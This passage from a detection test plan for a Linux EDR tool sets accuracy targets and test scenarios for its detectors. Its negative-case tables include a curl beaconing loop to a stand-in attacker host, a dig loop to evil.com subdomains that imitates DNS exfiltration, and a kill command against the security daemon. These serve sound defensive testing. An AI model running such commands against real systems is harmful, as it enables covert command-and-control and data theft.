2. **`xhelixctl rules test`** (rule-replay harness if present): every rule with `test_id:` field should have at least one positive + one negative test scenario.
3. **Replay from chain**: re-feed events from a saved chain through a fresh correlator instance. Assert: identical alert set produced (replayability invariant).

### Negative cases

For each Tier-1 rule, document the specific event shape that fires it. Mass-test by:
- Drive each rule's trigger 100 times.
- Count alerts.
- Target: 99/100 minimum.

### Edge cases

- **CEL `has(map[k])` trap** (per ERRORS.md): regression-test by writing a rule using `has(event.tags["foo"])` and confirming the linter rejects it.
- **Concurrent event from same PID**: correlator's single-goroutine design serializes these. Stress with multi-PID interleaving.

### Stress

- **100K events/sec into the correlator**: drop rate must be 0; latency-to-correlate <50ms p99.

### Empirical measurement

1. **Per-rule confusion matrix**: write a harness that for each rule, produces N positive events and M negative events; count alerts.
2. **Replay-determinism test**: save a 24h chain. Replay. Diff alert list. Must be byte-identical.
3. **Class_map calibration**: every rule has a `tier` (1/2/3). Track quarterly: which rules need re-tiering based on observed FP?

### Honest ceiling

- Rules are operator-tuneable; per-host class_map demotions (rejected by user this session) can hide rules that should fire. Discipline: tune the *rule*, not the per-host classification.

---

## 3.10 autobaseline (per-host observe → seal → detect)

**Target FP rate:** <2% post-seal (24h observe period).
**Target TP rate:** ≥90% on novel binaries / behaviors not seen during observation.

### Positive cases

1. **First 24h**: ModeObserve. NO destructive actions. Every binary execve records.
2. **Post-seal**: known binaries don't alert. New binaries alert.

### Negative cases

| Scenario | Expected |
|---|---|
| After seal, `apt install nmap; nmap -p- localhost` | unknown-binary `nmap` alerts |
| After seal, drop `/tmp/x` and run | unknown-binary alert |
| After seal, run `find` (was in baseline) → silent | silent (it's known) |

### Edge cases

- **Re-seal after cluster expansion**: if operator deploys 10 new services post-seal, the baseline doesn't cover them. Provide `xhelixctl baseline reseal` workflow; test it.
- **PID reuse during observe window**: PIDs roll over. Baseline must key on image hash, not PID.

### Empirical measurement

1. **Seal accuracy**: at hour 24 minus 1, take a snapshot of `IsKnown()` results. At hour 25, run the same set. Diff. Expect: identical (seal preserves the observed set).
2. **Drift over 30 days**: track which binaries START appearing in alerts that weren't in the original observation. Each should map to a known cause (new package, manual install).

---

## 3.11 baseline (per-binary feature aggregates, EWMA + sigma)

**Target FP rate:** <3% (anomaly detection is inherently noisier than invariant checks).
**Target TP rate:** ≥80% on actual behavioral anomalies (rate spikes, new endpoints, child-proc-count drift).

### Positive cases

1. **Stable workload**: baseline normalizes; no alerts.
2. **Diurnal pattern**: traffic spikes at 9am, dips at 3am. Baseline learns the periodicity; doesn't alert on the spike.

### Negative cases

| Scenario | Expected |
|---|---|
| php-fpm starts making outbound connections it never made before | rate-sigma alert |
| sshd spawning 50 children in 10 sec (brute force or post-exploitation) | spawn-burst alert |
| nginx writing 10x its normal byte volume to a new dest | byte-volume sigma alert |

### Edge cases

- **Slow drift**: behavior changes gradually over weeks. EWMA naturally absorbs slow drift. Test: simulate a slow ramp-up; assert no alert. Then test a sharp jump; assert alert.
- **Warmup period**: first N hours have insufficient data. Should NOT alert (configurable `warmup_hours`).

### Stress

- **High-cardinality features**: 10K unique endpoints per binary. Memory growth must stay bounded.

### Empirical measurement

1. **TP**: deliberate behavior change post-warmup. Measure how long until alert fires.
2. **FP**: 30-day soak. Count alerts; investigate each.

---

## 3.12 takeover planner

**Target FP rate:** <1% on full plans (combines multiple signals).
**Target TP rate:** ≥95% on lineages that hit ≥3 signals.

### Positive cases

1. **Operator running a privileged maintenance script**: may hit signal-1 (uid0 transition) but should not score above min threshold.

### Negative cases

| Scenario | Expected score |
|---|---|
| Webshell drop + outbound + persistence | score ≥ 70 (composite) → plan emitted |
| BPFdoor install: unknown binary + raw socket + bpf syscall + reverse shell | score ≥ 90 → critical plan |
| Roundcube RCE post-exploitation: php-fpm spawn shell + curl /tmp + outbound | score ≥ 80 |

### Edge cases

- **Slow-roll attack**: signals arrive over hours, each individually subthreshold. Planner must aggregate over lineage lifetime, not within a single time window. Test: same lineage_id over 6 hours, each signal at +1h. Assert: score still aggregates.

### Empirical measurement

Already has 4 test files / 830 LOC. Run the existing tests + add a "slow-roll" integration test.

---

## 3.13 egress observer (Mode-1)

**Target FP rate:** N/A (it's observation; FP measures downstream rules).
**Target TP rate:** ≥98% classification accuracy on outbound flows.

### Positive cases

1. **Plesk vhost outbound** to dev_registry (composer / npm fetches): correctly classified as `cdn` or `dev_registry`.
2. **System updates** to `archive.ubuntu.com`: classified as `package_manager`.

### Negative cases

| Scenario | Expected class |
|---|---|
| Outbound to `paste.bin/something`: classify as `paste` or `dynamic_dns` |
| Outbound to a country not in operator's expected list: `dest_country` tag with unusual_country=true |
| Outbound to a /16 known-bad IP block | `threat_intel_hit=true` |

### Edge cases

- **CDN vs C2 ambiguity**: attacker uses Cloudflare-fronted C2. Domain looks legit. Classification can't distinguish at the network layer. Mitigation: composition with SNI + DNS + JA3 — separate roadmap.

### Empirical measurement

1. **Classification accuracy**: sample 1000 outbound flows; manually tag each. Compare to observer's classification.
2. **Coverage**: ensure every destination-class in the dlcf taxonomy has a representative sample.

---

## 3.14 snicheck (TLS no-SNI)

**Target FP rate:** <0.5% (already verified 0 in 5min of organic prod traffic today).
**Target TP rate:** ≥98% on actual no-SNI TLS outbound.

### Positive cases

1. **Normal HTTPS**: 1000 curl commands to varied sites. 0 snicheck events.
2. **NTP-over-TLS to allowlisted CIDR**: silent (extra_cidrs covers).
3. **apt / dnf / snap (allowlisted comms)**: silent.

### Negative cases

| Scenario | Expected |
|---|---|
| `openssl s_client -connect 1.1.1.1:443 -noservername` | `tls_no_sni` alert |
| curl with explicit `-H "Host: "` (drops SNI on some libcurl versions) | alert (if SNI absent) |
| Custom client speaking TLS to a hardcoded IP | alert |

### Edge cases

- **Connection torn down before 800ms eval delay**: detector misses. Document — there's an inherent race between connect + send vs. eval. Tune EvalDelay if needed.
- **Encrypted Client Hello (ECH)**: SNI is encrypted, so dpi can't extract it. snicheck would alert as "no SNI." Mitigation: known-ECH-capable destinations to allowlist. Roadmap.

### Empirical measurement

1. **TP**: scripted no-SNI attempts. 100 trials. Already verified working live (4 alerts on `openssl -noservername`).
2. **FP**: 7-day soak. Investigate every alert.

---

## 3.15 beacon detector

**Target FP rate:** <10% (period+jitter patterns false-positive on health checks).
**Target TP rate:** ≥70% on naive beacons.

### Positive cases

1. **Monit polling at 30s intervals**: should NOT alert (periodicity is in allowlist of known-good clients).
2. **Backup cron at daily intervals**: NOT in beacon scope (interval too long).

### Negative cases

| Scenario | Expected |
|---|---|
| `while true; do curl https://attacker; sleep $((RANDOM % 60 + 30)); done` | beacon alert within ~5 callbacks |
| Constant-period beacon every 60s ± 5s jitter | alert within 4-5 callbacks |

### Edge cases

- **High-jitter beacons (jitter > period)**: very hard to detect statistically. Document: ceiling.
- **Beaconing to a CDN-hosted C2**: classification confounds. Composition with intel/SNI/lineage needed.

### Empirical measurement

1. **TP**: simulate beacons with varied period/jitter; measure time-to-first-alert.
2. **FP**: 30-day soak. Track every beacon alert; classify legit (health probes) vs adversarial.

---

## 3.16 dnsexfil detector

**Target FP rate:** <15% (noisy by design).
**Target TP rate:** ≥60% on textbook DNS-tunnel exfil.

### Positive cases

1. **Legitimate high-rate DNS** (busy cluster, DNS caching disabled): should be allowlisted by lineage.
2. **`nslookup` loops by an admin**: known FP source. Add to comm allowlist.

### Negative cases

| Scenario | Expected |
|---|---|
| `for i in {1..1000}; do dig $RANDOM.$RANDOM.evil.com; done` | dns_exfil alert |
| `iodine`-style DNS tunnel (high-entropy TXT records) | dns_exfil alert |

### Empirical measurement

Standard TP/FP soak. Document expected FP rate honestly.

---

## 3.17 threatintel (IP/CIDR feed)

**Target FP rate:** depends entirely on feed quality. Typical ~1-5%.
**Target TP rate:** depends on feed coverage. Cloudflare-hosted threats: low coverage.

### Positive cases

1. **Outbound to AWS S3** (massive CDN range): must NOT be threat-intel-flagged unless the specific bucket is named.
2. **Outbound to GitHub**: must NOT flag.

### Negative cases

| Scenario | Expected |
|---|---|
| Outbound to a known-bad IP (current ThreatFeed Feb 2026 sample) | threat_intel_hit alert |
| Outbound to a Tor exit node (if in feed) | flag |

### Edge cases

- **Feed staleness**: track feed-age metric. If >7 days old, downgrade alerts to advisory.
- **False-positive in feed itself**: some feeds include CDN ranges accidentally. Maintain a per-feed allowlist.

### Empirical measurement

1. **Coverage**: pick 50 known-bad IOCs from public threat reports; check which are in the feed.
2. **FP**: 30-day soak, count alerts grouped by feed source.

---

## 3.18 YARA scanner (on-exec)

**Target FP rate:** <1% (depends on rule quality; YARA rules are picky).
**Target TP rate:** ≥80% on rule-matched samples.

### Positive cases

1. **Normal binaries**: 0 alerts. Test against /usr/bin/* baseline.
2. **Common dev tools** (gcc, make, etc.): 0 alerts.

### Negative cases

| Scenario | Expected |
|---|---|
| Drop a sample with embedded "Cobalt Strike" string | YARA match (if CS rule loaded) |
| Mimikatz binary execve | YARA match |
| Public Lazarus YARA rules from this session's analysis: drop a binary matching the strings | YARA match |

### Edge cases

- **Packed / obfuscated**: YARA only sees what's on disk. UPX-packed Cobalt Strike with the strings encoded won't match string-based rules. Need entropy / packer-detection rules.

### Empirical measurement

1. **TP**: VirusTotal-known samples (each rule should match its target family).
2. **FP**: scan every binary in /usr/bin/, /usr/lib/. Expect 0 matches unless rule is bad.
3. **Coverage**: count unique malware families covered by loaded rule set.

### Honest ceiling

**Zero unit tests today.** Highest-leverage immediate work: add 5-10 tests covering rule load, basic match, no-match case.

---

## 3.19 response / enforce / netban

**Target FP rate:** Soak-gate dependent. 0% post-soak is the design target.
**Target TP rate:** ≥98% on Soak-validated triggers.

### Positive cases

1. **Soak gate stops single-event triggers**: simulate one alert. Assert: no enforce action taken (Soak requires N matches in M window).
2. **PanicSwitch released by operator**: enforce actions resume.

### Negative cases

| Scenario | Expected |
|---|---|
| 5 critical alerts in 60s from same lineage_id | Soak triggers; enforce action runs (e.g., netban) |
| Operator-initiated `xhelixctl response trigger` for a specific lineage | action runs |

### Edge / dangerous cases

- **Quarantine the wrong process**: simulate a misclassified alert that would quarantine xhelix's parent. Assert: SELF-PROTECT blocks this; xhelix-watchdog detects and reports.
- **Netban a legitimate IP** (CDN endpoint): Soak threshold must be high enough; PanicSwitch must be quickly accessible.
- **Race between netban and process exit**: process is gone; netban applies anyway (drops at L4). Behavior must be tested.

### Empirical measurement

1. **Soak threshold accuracy**: at threshold N=5 within 60s, fire 4 events → no action. Fire 5 → action. Verify exact-threshold behavior.
2. **Recovery time**: after PanicSwitch, time-to-resume.
3. **Chaos**: kill -9 the response goroutine. Watchdog must respawn.

### Honest ceiling

**Lightly tested.** Recommend staged rollout: start with netban-only enforce in shadow mode; quarantine in shadow before real; full enforce only after 30-day soak.

---

## 3.20 posture procfs / modsig (advisory)

**Target FP rate:** 0% (read-only; reports what is).
**Target TP rate:** N/A; this is observation of host state.

### Positive cases

1. **`xhelixctl posture procfs status`** on a freshly-applied host: reports all-green.
2. **`xhelixctl posture modsig`** on a Secure-Boot + signed-modules host: reports all-strong.

### Negative cases

| Host state | Expected report |
|---|---|
| ptrace_scope=0 | weak |
| suid_dumpable=2 | weak |
| no sysctl drop-in | missing |
| sig_enforce=N | weak |
| lockdown=[none] | weak (must handle bracketed-active syntax correctly — verified) |
| process X with CAP_SYS_MODULE (non-root) | flagged in CapSysModuleHolders |

### Edge cases

- **mokutil missing**: secureboot=unknown (already implemented).
- **Container host**: /sys/firmware/efi/efivars unreadable. secureboot=unknown.

### Empirical measurement

`xhelixctl posture procfs status` + `xhelixctl posture modsig` on a matrix of:
- Bare-metal Secure-Boot Ubuntu 24.04
- Plesk on Ubuntu 22.04 (today's prod)
- Debian 12 LXD container
- Rocky 9 KVM VM
- Cloud VPS (Hetzner, DO, AWS)

Verify each reports correctly.

---

## 3.21 chain + xhelix-verify

**Target FP rate:** 0% (cryptographic verification; deterministic).
**Target TP rate:** 100% on chain tampering.

### Positive cases

1. **Untampered chain**: `xhelix-verify --chain /var/lib/xhelix/chain --pub <key>` exits 0.
2. **Verify after legitimate restart**: chain across restart boundaries should still verify.

### Negative cases

| Scenario | Expected |
|---|---|
| Flip one byte in any batch | verify fails; names the exact tampered batch |
| Delete a batch | verify fails; names the missing index |
| Replace a batch with one signed by a different key | verify fails (signature mismatch) |
| Tamper with chain head | verify fails on first batch |

### Edge cases

- **Clock skew**: batches signed at slightly different times. Order must be preserved.
- **Disk-full at chain write**: must not corrupt; pkg/diskwarden handles.

### Empirical measurement

Trivially testable. Scripted: flip a random byte in a random batch; assert verify fails. 100 trials → 100/100 failures.

---

## 3.22 xhelix-watchdog (self-protect)

**Target FP rate:** 0% (it's a respawn detector; no FP).
**Target TP rate:** ≥99% on userspace SIGKILL.

### Positive cases

1. **Normal restart via systemctl**: watchdog should NOT respawn xhelix; systemd handles cleanly.
2. **Clean shutdown via SIGTERM**: watchdog notices but doesn't respawn (operator-initiated).

### Negative cases

| Scenario | Expected |
|---|---|
| `kill -9 $(pgrep -o xhelix)` | watchdog detects within 5s; respawns xhelix |
| OOM-killer hits xhelix | respawn |
| Crash (induced via a fault injection): respawn |

### Edge cases

- **Watchdog itself killed**: who watches the watchdog? Configure systemd to restart it. Test that path.
- **Tight kill loop**: kill watchdog + xhelix simultaneously. systemd brings both back; xhelix should resume operations within ~10s.
- **Ring-0 attacker**: a kernel module kills xhelix's task_struct. Watchdog sees the disappearance but its respawn might also be killed. **This is the named residual** — ring-0 wins.

---

# Part 4 — Cross-cutting test approach

## 4.1 The "every-Tuesday" gauntlet

A scripted attack harness that runs weekly against a staging host mirroring prod. Each run produces:

- TP/FN/FP/TN counts per detector
- Latency-to-detect histogram per detector
- New alerts that need triage (signal of detector drift or environmental change)

Components:

1. **Attack-sim suite** (`tests/attack-sim/` already exists with: dga-dns, ld-preload, metadata-access, pam-module-drop, python-c2, reverse-shell, ssh-key-add, suid-binary, tmp-binary, web-spawns-shell). Extend with: BYOVD-equivalent (init_module), Lazarus-class memfd loader, RemotePE-style in-memory implant simulation, Roundcube-class web RCE follow-on.
2. **Replay engine**: drive recorded prod events through a fresh daemon; assert identical alerts.
3. **Chaos hooks**: random kill / disk-full / network-partition injected during the gauntlet.

## 4.2 Production-mirror staging

A staging host kept ≤24h behind prod. Every release runs the full gauntlet here first. Real prod traffic is replayed via tcpreplay or similar.

## 4.3 FP-rate honesty

For each detector, maintain a `fp_log.csv` populated by the operator triaging real alerts. Quarterly: re-compute observed FP and update the FP-target column in this document.

## 4.4 Cross-kernel matrix

Run the gauntlet on:
- Ubuntu 22.04 (5.15 kernel)
- Ubuntu 24.04 (6.8 kernel) — current prod
- Debian 12 (6.1 kernel)
- Rocky 9 (5.14 kernel — minimum supported)
- Alpine 3.19 (musl + 6.6 kernel)

Each detector should pass on all matrix entries OR document the kernel floor.

## 4.5 Coverage gate for CI

Before any commit lands:
- `make vet` clean
- `go test -race -count=1 ./...` green
- `make build` succeeds, statically linked
- `xhelixctl rules lint` 80/80 valid
- Any new sensor / detector must ship with ≥1 unit test
- Any change to the eBPF .bpf.c must successfully load on the CI matrix kernels

---

# Part 5 — Honest non-promises

1. **Same-host root attacker with kernel zero-day or ring-0 capability beats xhelix.** No userspace EDR survives. The named residual ceiling per `BEHAVIORAL_DEFENSE.md`.
2. **In-memory implant living in a legitimate process's memory** is detected ~25-40% by procmem + memdiff; remaining ~60-75% requires off-host execution or YARA-on-suspicious-lineage (roadmap).
3. **PHP/Node/Python script-level RCE** is detected post-execution, not at deserialization. Prevention requires interpreter cooperation.
4. **C1 Mode-2 disarm** is not built. Egress traffic is OBSERVED + CLASSIFIED, not blocked, in the general case. Specific paths (netban via takeover, snicheck → operator → manual netban) work but aren't automated.
5. **Encrypted Client Hello (ECH) and encrypted DNS (DoH/DoT)** are not transparently inspectable.
6. **Patch-level CVE matching** is out of scope. `apt upgrade` is the answer; xhelix complements, doesn't replace.

---

# Appendix A — File layout

```
xhelix/
├── cmd/
│   ├── xhelix/                  daemon entry point + dispatch
│   ├── xhelixctl/               operator CLI (status, top, posture, rules, ...)
│   ├── xhelix-verify/           offline chain verifier
│   ├── xhub/                    fleet baseline hub
│   ├── xhelix-watchdog/         self-respawn helper
│   └── xhelix-{honeysh,sinkhole,dnspoison}/  C2 engagement primitives (parked)
├── sensors/                     observation sources (Sensor interface)
│   ├── ebpf/                    23-probe unified BPF .o + Go-side loader
│   ├── fim/                     inotify + vhost discovery
│   ├── credbroker/              (lives under pkg/credbroker/; fangate is sensor-shaped)
│   ├── procmem/, memdiff/, procscrape/
│   ├── decoy/, identity/, dpi/, dnsresolver/
│   ├── netids/, lsmaudit/, memory/, heartbeat/
├── pkg/                         ~136 subpackages of analytics + infrastructure
│   ├── pipeline/                the per-event handler
│   ├── rules/, correlator/
│   ├── credbroker/              fangate + sealed/honey/plaintext
│   ├── integrity/, baseline/, autobaseline/, takeover/
│   ├── egress/, egressmon/, snicheck/
│   ├── beacon/, dnsexfil/, threatintel/
│   ├── chain/, hotstore/, coldstore/
│   ├── posture/{procfs,modsig}/
│   ├── response/, enforce/, netban/
│   └── ... 100+ more
├── ruleset/
│   ├── core/                    80 CEL rules + class_map
│   └── dlcf/                    13 data-leak-containment rules
├── tests/
│   ├── attack-sim/              scripted attack chains
│   ├── active/, harness/, redteam/
└── docs/                        ~30 architecture + roadmap docs
```

# Appendix B — Key external dependencies

- `github.com/cilium/ebpf` — eBPF loader / ringbuf reader
- `github.com/google/cel-go` — CEL rule expression engine
- `modernc.org/sqlite` — CGO-free SQLite
- `github.com/charmbracelet/bubbletea` — TUI framework
- `github.com/spf13/cobra` — CLI framework
- `gopkg.in/yaml.v3` — config parsing
- `github.com/oklog/ulid/v2` — event IDs
- `github.com/oschwald/maxminddb-golang` — GeoLite2 (optional)
